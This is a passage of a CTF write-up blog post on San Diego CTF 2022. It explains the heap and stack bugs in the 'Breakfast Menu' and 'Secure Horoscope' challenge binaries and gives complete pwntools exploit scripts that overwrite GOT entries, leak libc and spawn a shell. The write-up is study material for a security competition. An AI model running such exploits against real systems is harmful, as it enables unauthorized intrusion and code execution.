<span class="keyword">if</span> (GLOBAL_IDX &lt;= <span class="number">15</span>) &#123;</span><br><span class="line">                orders[GLOBAL_IDX++] = <span class="built_in">malloc</span>(<span class="number">40</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;A new order has been created&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Too many orders, you can&#x27;t be making any more!!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<span style="color:red">
+This is the <b>worst</b> way of creating a heap challenge</span>. 
+
+<p>The author <code>green beans</code> just why would did you keep all the code in main function. The decompiled code looks ugly af. And then comes those <code>fflush</code> function. </p>
+<p><img src="https://i.imgur.com/TZHR9di.png"></p>
+<p>The options looks like this</p>
+<ol>
+<li>Create a note of size 40 bytes and increment <code>GLOBAL_IDX.</code> Store the heap pointer to an array of pointers in bss that’s the <code>orders</code> array.</li>
+<li>Modify&#x2F;write the contents to any notes that you have already created. It does this by taking 64 bytes of input from stdin using <code>fgets</code> function to a global buffer <code>buf</code> and then uses <code>strcpy</code> to copy the contents of <code>buf</code> variable to <code>orders[idx]</code>.</li>
+<li>Free any note that you have already created.</li>
+<li>Exit.</li>
+</ol>
+<p>The bugs in this challenge are :</p>
+<ol>
+<li>The edit option has an <strong>heap overflow</strong> bug. It copies 64 bytes to a 0x31 sized chunk.</li>
+<li>While specifying the index , it allows <strong>negative indexing</strong>. With this you can overwrite the contents in stdout structure in libc. But it uses <code>strcpy</code> to copy the contents so its painful to do any fsop.</li>
+<li><strong>Use After Free &amp; Double free</strong> bug. This allows <strong>Write After Free</strong> primitive.</li>
+</ol>
+<p><img src="https://i.imgur.com/bfNf1Li.jpg"></p>
+<p>For leaks overwrite <code>free</code> got with <code>printf</code>. So that you can then have a <strong>format string bug</strong> when you delete a note. It will then do <code>printf(our_input)</code> instead of actually freeing it.</p>
+<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><ol>
+<li>Create a chunk <code>A</code>.</li>
+<li>Delete that chunk <code>A</code>.</li>
+<li>Using the <strong>write after free</strong> bug. Edit chunk <code>A</code> to overwrite its fd with the got address of <code>free</code>.</li>
+<li>Overwrite <code>free</code> got with <code>printf</code> plt to create a format string bug scenario to get leaks.</li>
+<li>Edit chunk <code>A</code> with <code>%11$p</code>.</li>
+<li>Delete chunk <code>A</code>.</li>
+<li>Get libc leak.</li>
+<li>Edit the chunk back again and overwrite <code>free</code> got with <code>system</code> this time.</li>
+<li>Edit chunk <code>A</code> with “&#x2F;bin&#x2F;sh”.</li>
+<li>Delete chunk <code>A</code>.</li>
+<li>Get shell</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author := 4n0nym4u5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">exe  = context.binary = ELF(<span class="string">&#x27;./BreakfastMenu&#x27;</span>)</span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">&#x27;breakfast.sdc.tf&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">idx=-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">cmd</span>):</span><br><span class="line">	sla(<span class="string">&quot;4. Pay your bill and leave\n&quot;</span>, <span class="built_in">str</span>(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>():</span><br><span class="line">	<span class="keyword">global</span> idx</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	idx=idx+<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> idx</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">&quot;which order would you like to modify\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sla(<span class="string">&quot;What would you like to order?\n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&quot;which order would you like to remove\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">libc=SetupLibcELF()</span><br><span class="line">io = start()</span><br><span class="line">A=create()</span><br><span class="line">delete(A)</span><br><span class="line">edit(A, p64(exe.got.free - <span class="number">8</span>))</span><br><span class="line">junk=create()</span><br><span class="line">target=create() <span class="comment"># returns heap above the free got</span></span><br><span class="line">edit(target, <span class="string">b&quot;A&quot;</span>*<span class="number">8</span> + p(exe.sym.printf))</span><br><span class="line">edit(A, <span class="string">&quot;%9$p||%10$p||%11$p||%12$p||%13$p||%14$p||%15$p||%16$p&quot;</span>)</span><br><span class="line">delete(A) <span class="comment"># trigger format string bug</span></span><br><span class="line">leaks=GetInt(rl())</span><br><span class="line">libc.address = leaks[<span class="number">2</span>]-<span class="number">0x21c87</span></span><br><span class="line">lb()</span><br><span class="line">edit(target, <span class="string">b&quot;A&quot;</span>*<span class="number">8</span> + p(libc.sym.system))</span><br><span class="line">edit(A, <span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(A)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Secure-Horoscope"><a href="#Secure-Horoscope" class="headerlink" title="Secure Horoscope"></a>Secure Horoscope</h2><blockquote>
+<p><strong>Description</strong> : Our horoscope developers have pivoted to a more security-focused approach to predicting the future. You won’t find breaking into this one quite so easy! <br><br><strong>Challenge File</strong> : <a target="_blank" rel="noopener" href="https://cdn.discordapp.com/attachments/808487148332122144/972246561272770640/secureHoroscope">binary</a> <br><br><strong>Docker File</strong> : <a target="_blank" rel="noopener" href="https://cdn.discordapp.com/attachments/808487148332122144/972246546773065828/Dockerfile">DockerFile</a> <br><br><strong>Solves</strong> : 53 <br><br><strong>Points</strong> : 250 <br></p>
+</blockquote>
+<h3 id="Checksec-3"><a href="#Checksec-3" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x3ff000)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Overview-3"><a href="#Overview-3" class="headerlink" title="Overview"></a>Overview</h3><p><img src="https://i.imgur.com/qOB9Hom.png"></p>
+<p><img src="https://i.imgur.com/iGJLhst.png"></p>
+<p>The <code>main</code> function reads 40 bytes to a 40 byte character array which is safe. And in the <code>getInfo</code> function it reads 140 bytes of user input from stdin to <code>info</code> variable which is a 100 byte character array. So there is a <strong>stack buffer overflow</strong> bug here. </p>
+<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><ul>
+<li>Input anything you want in your first input.</li>
+<li>112 bytes of padding + RBP -&gt; bss  + RIP -&gt; <code>0x4007cf</code></li>
+</ul>
+<p><img src="https://i.imgur.com/0TuhK8w.png"></p>
+<p>Now you can read 140 bytes of rop chain in bss and stack pivot there.</p>
+<ul>
+<li>The rop chain uses the fancy <code>3d_gadget</code> ? xD. I am not going to explain on the gadget much as i have done <a target="_blank" rel="noopener" href="https://4n0nym4u5.netlify.app/post/asian-cyber-security-challenge-2021/">here</a> in this challenge.</li>
+</ul>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">0x000000004006a8:</span> <span class="string">add</span> [<span class="string">rbp-0x3d</span>]<span class="string">,</span> <span class="string">ebx;</span> <span class="string">nop</span> [<span class="string">rax+rax</span>]<span class="string">;</span> <span class="string">rep</span> <span class="string">ret;</span> </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>So the rop chain will change the got of <code>fflush</code> to <code>one_gadget</code> and we then stack pivot on <code>fflush</code> to run the <code>one_gadget</code>.</li>
+</ul>
+<p><img src="https://i.imgur.com/zXILsbo.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author := 4n0nym4u5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">exe  = context.binary = ELF(<span class="string">&#x27;./secureHoroscope&#x27;</span>)</span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">&#x27;sechoroscope.sdc.tf&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">libc=SetupLibcELF()</span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;To get started, tell us how you feel\n&quot;</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;day/year/time) and we will have your very own horoscope\n\n&quot;</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">112</span> + p(<span class="number">0x6010c0</span>+<span class="number">0x70</span>) + p(<span class="number">0x00000000004007cf</span>) + p(<span class="number">0xdeadbeef</span>) )</span><br><span class="line">rop = add_gadget(exe.got.fflush, libc.address+<span class="number">0x7e790</span>, one_shot()[<span class="number">1</span>]) + pivot(exe.got.fflush)</span><br><span class="line">sl( rop.ljust(<span class="number">112</span>, <span class="string">b&quot;A&quot;</span>)  + p(<span class="number">0x6010c0</span>-<span class="number">8</span>) + gadget(<span class="string">&quot;leave; ret&quot;</span>) )</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oil-Spill"><span class="toc-number">1.</span> <span class="toc-text">Oil Spill</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec"><span class="toc-number">1.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-number">1.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Horoscope"><span class="toc-number">2.</span> <span class="toc-text">Horoscope</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-1"><span class="toc-number">2.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-1"><span class="toc-number">2.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-1"><span class="toc-number">2.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Breakfast-Menu"><span class="toc-number">3.</span> <span class="toc-text">Breakfast-Menu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-2"><span class="toc-number">3.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-2"><span class="toc-number">3.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-2"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Secure-Horoscope"><span class="toc-number">4.</span> <span class="toc-text">Secure Horoscope</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Checksec-3"><span class="toc-number">4.1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-3"><span class="toc-number">4.2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-3"><span class="toc-number">4.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&text=San Diego CTF 2022"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&is_video=false&description=San Diego CTF 2022"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=San Diego CTF 2022&body=Check out this article: http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&title=San Diego CTF 2022"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&name=San Diego CTF 2022&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/05/10/San%20Diego%20CTF%202022/&t=San Diego CTF 2022"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    4n0nym4u5
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
